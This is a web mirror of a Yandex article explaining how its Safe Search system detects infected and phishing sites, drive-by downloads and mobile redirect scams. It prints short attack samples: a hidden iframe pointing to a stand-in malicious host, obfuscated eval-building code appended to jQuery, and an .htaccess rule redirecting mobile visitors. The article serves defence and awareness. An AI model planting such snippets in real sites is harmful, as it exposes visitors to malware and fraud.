<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Device System Safe Search Yandex</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="In 2007, Yandex was confronted with a virus that massively replaced Yandex search results on users' computers. Instead of relevant results, non-query ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Device System Safe Search Yandex</h1><div class="post__text post__text-html js-mediator-article">  In 2007, Yandex was confronted with a virus that massively replaced Yandex search results on users' computers.  Instead of relevant results, non-query ads were substituted.  It was necessary to urgently seek a solution to the problem.  Studying it, we found out that the virus gets on user computers using drive-by-download attacks.  Infected pages initiate hidden downloads of malicious files.  Then, exploiting the vulnerabilities of the user system, the malware is installed on the computer. <br><br>  Antivirus programs do not always protect users from this type of attack and new, just repackaged, malicious software, so users need extra protection.  We realized that in order to overcome this phenomenon, we need to detect infection of sites, help webmasters remove malicious code, and also motivate them not to participate in partner networks through which drive-by-download-attack blocks are distributed. <br><br> <a href="http://habrahabr.ru/company/yandex/blog/195408/"><img src="https://habrastorage.org/getpro/habr/post_images/e5a/d0f/437/e5ad0f437cf5f78a2392dc2fad02b13d.png" alt="image"><br></a><a name="habracut"></a> 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      At a certain point, it became clear that the problem is of an ecosystem nature, and that if you do not deal with viral and fraudulent monetization of sites, its scale will quickly grow.  Ultimately, this will undermine the confidence of users in the Internet, will hinder its growth and even jeopardize its existence in its usual form.  Therefore, six years ago we began to design and develop a system for detecting dangerous sites, and four years ago it was launched.  Now we continue to actively develop our system, adapt it for new threats, apply methods that allow you to detect malicious code that has not yet entered the anti-virus signature databases. <br><br><h4>  How does the anti-virus scan of Yandex </h4><br><br>  It all starts with the fact that our anti-virus robot enters the page to be checked and downloads all the data that, when viewed, gets into the browsers of ordinary users.  Then the downloaded data is analyzed. <br><br>  The behavioral analyzer tracks everything that happens when you view the page, including the browser, plug-ins (in particular, designed to execute <a href="">Java-code</a> and view <a href="">PDF-files</a> ) and the operating system as a whole.  Observation results are compared with patterns of malicious behavior.  The main advantage of the behavioral approach is the ability to detect malicious code whose signatures have not yet managed to get into the anti-virus database.  It is this code that is often used by attackers when infecting large sites. <br><br>  In addition, we observe if the page does not access the servers that are known as distributors of malicious code.  This is how our black list works. <br><br>  As an additional means of protection, we carry out a signature analysis of the search database using the Sophos antivirus scanner.  We have mutually beneficial cooperation with this company: they understand the importance of the data we provide, respond quickly to our messages and train their system. <br><br>  Our biological analyzers, virus analysts, determine the patterns of malware behavior.  They conduct research on modern samples of malicious code, identify common signs and patterns in their work.  Research results are used to improve behavioral detectors, and blacklist extensions, and are sent as examples of malicious code to Sophos. <br><br>  In total, the system performs more than 20 million checks per day, as a result of which about 5,000 new infections are detected and more than 80,000 sites are confirmed to be infected.  The more popular the site and the greater the risk of infection, the more often it is checked by our system. <br><br><h4>  What are we protecting from? </h4><br>  The number of attacks on Internet users is still held by drive-by-download attacks.  In the course of their implementation, attackers embed malicious code into legitimate web applications, which in addition to the content of the site, specially crafted web pages are loaded, which, using vulnerabilities in browsers and other software, secretly install malicious programs for users. <br><br>  Such code may look, for example, as follows: <br><br><pre><code class="html hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">iframe</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://evilsite.ws/wp-content/plugins/wordpress-importer/cash.php"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">width</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"13"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">height</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"14"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">frameborder</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"0"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">style</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"visibility: hidden; display: none"</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">iframe</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><br>  Usually the link in the iframe is obfuscated code.  Thus, intruders try to prevent signature detection. <br><br>  Obfuscation also applies when adding malicious code to the end of a legal library, for example, jQuery.  To protect yourself from attacks of this kind, you can not keep the JS-library on your server, and take them from reliable sources.  Yandex has its own <a href="https://tech.yandex.ru/jslibs/">hosting of</a> popular JavaScript-libraries, which everyone can use. <br><br><pre> <code class="javascript hljs"> <span class="hljs-comment"><span class="hljs-comment">/*! jQuery v1.8.2 jquery.com | jquery.org/licence */</span></span> (<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">a,b</span></span></span><span class="hljs-function">)</span></span>{<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">G</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">a</span></span></span><span class="hljs-function">)</span></span>{<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> b=F[a]={};<span class="hljs-keyword"><span class="hljs-keyword">return</span></span> p.each(a.split(s),<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">a,c</span></span></span><span class="hljs-function">)</span></span>{b{c}=!<span class="hljs-number"><span class="hljs-number">0</span></span>}),b} <span class="hljs-comment"><span class="hljs-comment">/* jQuery code cutted */</span></span> &amp;&amp;define(<span class="hljs-string"><span class="hljs-string">"jquery"</span></span>,[],<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>)</span></span>{<span class="hljs-keyword"><span class="hljs-keyword">return</span></span>})})(<span class="hljs-built_in"><span class="hljs-built_in">window</span></span>); <span class="hljs-comment"><span class="hljs-comment">//end of jquery code var domain = 'http://somedomain.ru'; v = "v" + "al"; if (020 === 0x10 &amp;&amp; window.document) { try { document.body++ } catch(gdsgsdg) { asd = 0; try { d = document.createElement("div"); d.innerHTML.a = "asd"; }catch (agdsg) { asd = 1; } if (!asd) { w = {a:window},a; v = "e".contact(v); } } } e = w["" + v];</span></span></code> </pre> <br><br>  With the spread of mobile devices, attacks on them are becoming increasingly popular.  The most frequent scenario in this case is the following: the owner of the site in order to monetize mobile traffic enters an affiliate program, and often without knowing it, places a mobile redirect on its page.  When viewed through a regular browser, the site behaves in a completely normal manner.  But it is necessary to enter it from a mobile device, as it will redirect to another page, where the user will be prompted to install any application, for example, an ‚Äúupdated‚Äù version of the browser.  At the same time, depending on the User Agent, the sites offer to download files with different extensions corresponding to the platform.  Further, the user will be prompted to send a paid SMS, or the installed application itself will send such messages without the user's knowledge.  If the application succeeds in gaining access to the user's contact list, it can be used to send spam. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/2af/e97/095/2afe97095048313458b12a783b09c894.png" alt="image"><br><br>  To implement such an attack, it suffices to modify the .htaccess file of the web server by adding redirection conditions to it: <br><br><pre> <code class="php hljs">RewriteCond %{HTTP_USER_AGENT} (android|midp|j2me|symbian|series\ <span class="hljs-number"><span class="hljs-number">60</span></span>|symbos|windows\ mobile|windows\ ce|ppc|smartphone|blackberry|mtk|bada|windows\ phone) [NC] RewriteRule (.*) http:<span class="hljs-comment"><span class="hljs-comment">//&lt;_ &gt; [L,R=302]</span></span></code> </pre> <br><br>  Our detection tools allow you to track such sites.  They do not go to the mobile issue pages, and in our browser for Android and iOS, warnings are displayed before entering the sites with redirects. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/463/3a4/565/4633a45659c33eeb10407bdb74c0d638.png" alt="image"><br><br>  In addition to the already mentioned attacks like drive-by-download, and redirects to pages with downloading malware, the site can be redirected to a phishing page that completely copies its interface.  Such sites usually require the input of personal information of the user, which is used for fraudulent purposes, as well as for sending spam. <br><br>  Phishing attacks include those cases where a banner is placed on the site, offering to download a new version of the browser.  When trying to download the installation file, the site offers to enter the phone number to which the confirmation code will be sent.  Allegedly, you prove that you are not a robot.  But in fact you will be subscribed to a paid service.  Often, such banners are the result of hacking a site or participating in unscrupulous affiliate programs. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/290/9c5/489/2909c5489255926249ad3e66eb442237.png" alt="image"><br><br><h4>  Hazard warnings </h4><br><br><img src="https://habrastorage.org/getpro/habr/post_images/007/0b9/c87/0070b9c876f7bf7987c602ff2797ebf2.png" alt="image"><br><br>  Information about the malicious sites we have found falls into the database.  Currently, we know more than 200 thousand infected and phishing sites around the world, and of these, about 20% have domains in zones owned by Russia and the CIS countries. <br><br>  When an infected site is detected, we send it to the webmaster <a href="">letters</a> to the standard addresses, as well as contacts specified in the registration information of the domain.  This reduces the average time during which the site remains infected, approximately 1.6 times. <br><br>  In the future, these data are used to alert users on <a href="">the search page</a> , in <a href="">Yandex.Mail</a> , <a href="http://browser.yandex.ru/">Browser</a> , as well as Opera and Mozilla Firefox with Yandex.Elements installed.  On average, we show about 5 million warnings on the search results page and in services, as well as about 3 million in browsers, but during periods of mass infection of sites, this number can reach up to 18 million warnings per day. <br><br>  Users can protect themselves with the help of the <a href="http://dns.yandex.ru/">Yandex.DNS</a> service.  Our DNS server, available at 77.88.8.88, provides filtering of dangerous sites and demonstrates warnings when trying to access them. <br><br>  Transitions on external links in Yandex. Mail are run through a special warning redirector.  It compares the link with the URL mask of the infected sites and, if a match is found, redirects it to a special warning page.  After that, the user himself can decide whether to go further. <br><br>  I would like to especially note that the links themselves from the letters from Yandex. Mails are not transmitted anywhere and are not checked by the SafeSearch system, but are exclusively compared with URL URL masks already known to Yandex.  Custom links in the Mail remain confidential and are never used either for indexing or for displaying contextual advertising. <br><br>  For infected sites that are registered in <a href="">Yandex.Webmaster</a> , we show detailed information about the infection.  If the webmaster himself cannot remove the infection and eliminate its causes, he may contact technical support for help. <br><br>  To check the URL for harmfulness, you can connect to the <a href="http://api.yandex.ru/safebrowsing/">Yandex Yandex Safe Browsing API</a> , or use <a href="https://www.virustotal.com/ru/">virustotal.com</a> - it <a href="">uses</a> Yandex Safe Search as one of the URL scanners. <br><br>  <i>We will be happy to receive samples of malware running on the web server side (for example, server backdoors, malicious Apache modules, infected CMS templates) at <a href="">virus-samples@yandex-team.ru.</a></i> <i><br><br></i>  <i>For cooperation please contact <a href="">safesearch@yandex-team.ru</a> .</i> <i><br></i>  <i>A booth of Yandex Antivirus Technology &amp; Safe Search will be located at YaC, where you can chat with our virus analysts, participate in a competition to detect malicious code, and learn more about the Safe Browsing API.</i> </div><p>Source: <a href="https://habr.com/ru/post/195408/">https://habr.com/ru/post/195408/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../195392/index.html">RailsClub'Moscow 2013. Interview with Vladimir Barsukov</a></li>
<li><a href="../195394/index.html">Meet GNOME 3.10</a></li>
<li><a href="../195398/index.html">Google Street View got to the Large Hadron Collider</a></li>
<li><a href="../195404/index.html">Behance - a community of creative professionals from around the world</a></li>
<li><a href="../195406/index.html">How not to miss in choosing a book scanner</a></li>
<li><a href="../195410/index.html">Google spent almost $ 21 billion to build data centers</a></li>
<li><a href="../195412/index.html">CloudLine Metrocluster seminar in the NORD 3 data center: how it was</a></li>
<li><a href="../195414/index.html">Pixel perfect layout</a></li>
<li><a href="../195416/index.html">IT union ?! Interview with a representative of "Novoprof" 'a</a></li>
<li><a href="../195418/index.html">Bill Gates: Ctrl + Alt + Del - it was a mistake</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>